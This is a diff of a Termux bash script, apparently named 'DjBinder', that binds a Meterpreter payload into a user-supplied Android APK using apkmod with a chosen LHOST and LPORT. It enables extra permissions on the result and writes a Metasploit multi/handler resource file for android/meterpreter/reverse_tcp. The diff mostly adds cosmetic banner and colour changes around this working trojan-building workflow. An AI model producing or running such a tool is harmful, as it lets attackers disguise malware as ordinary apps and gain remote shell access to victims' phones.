@@ -1,26 +1,39 @@
+
+djbinder
 #!/data/data/com.termux/files/usr/bin/bash
-figlet Dj Binder
 cd /sdcard
-mkdir DjBinder
-echo "INPUT APP PATH"
+mkdir djbinder
+cd
+cd djbinder
+play .welcome.mp3
+cd
+clear
+tput setaf 1; echo "Made by Hackerdj"
+echo "     "
+echo "      "
+echo -e "\033[32m$(figlet -f ASCII-Shadow 'DJBINDER')\033[0m" | lolcat -t
+echo "    "
+echo "   "
+tput setaf 1; echo "INPUT APP PATH"
 read path
-echo "INPUT LHOST"
+tput setaf 1; echo "INPUT LHOST"
 read lhost
-echo "INPUT LPORT"
+tput setaf 1; echo "INPUT LPORT"
 read lport
-echo "OUTPUT NAME.apk"
+tput setaf 1; echo "OUTPUT NAME.apk"
 read output
-apkmod -b "$path" -o /sdcard/DjBinder/payload.apk LHOST="$lhost" LPORT="$lport"
-apkmod --enable-perm=/sdcard/DjBinder/payload.apk -o /sdcard/DjBinder/"$output"
-cd /sdcard/DjBinder
+apkmod -b "$path" -o /sdcard/djbinder/payload.apk LHOST="$lhost" LPORT="$lport"
+apkmod --enable-perm=/sdcard/djbinder/payload.apk -o /sdcard/DjBinder/"$output"
+cd
+cd /sdcard/djbinder
 rm -rf payload.apk
 cd
 cd djbinder
 rm -rf d.rc
-echo "LHOST$lhost"
-echo "INTER LISTNER PORT"
+tput setaf 1; echo "LHOST$lhost"
+tput setaf 1; echo "INTER LISTNER PORT"
 read port
-echo "use multi/handler" > d.rc
+echo "use exploit/multi/handler" > d.rc
 echo "set payload android/meterpreter/reverse_tcp" >> d.rc
 echo "set lhost $lhost" >> d.rc
 echo "set lport $port" >> d.rc
